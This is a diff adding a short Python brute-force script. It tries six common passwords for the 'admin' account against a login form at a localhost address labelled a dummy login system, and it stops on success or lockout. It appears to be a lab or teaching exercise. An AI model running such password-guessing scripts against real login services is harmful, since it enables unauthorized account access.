@@ -1,0 +1,30 @@
+import requests
+
+# Target URL and Credential Info
+url = "http://127.0.0.1:5000/"  # URL of the Dummy Login System
+username = "admin"  # Target username
+password_list = ["1234", "password", "admin", "qwerty", "password123", "letmein"]  # Passwords to try
+
+# Brute Force Attack Function
+def brute_force_attack():
+    for password in password_list:
+        print(f"Trying password: {password}")  # Log the password being tried
+        try:
+            # Send POST request with username and password
+            response = requests.post(url, data={"username": username, "password": password})
+            
+            # Check if the response contains "Login successful!"
+            if "Login successful!" in response.text:
+                print(f"Password found: {password}")  # If successful, print the password
+                break
+            elif "Account locked" in response.text:
+                print("Account is locked. Stopping brute force attack.")
+                break
+            else:
+                print("Incorrect password.")  # If unsuccessful, continue
+        except requests.exceptions.RequestException as e:
+            print(f"An error occurred: {e}")
+            break
+
+if __name__ == "__main__":
+    brute_force_attack()
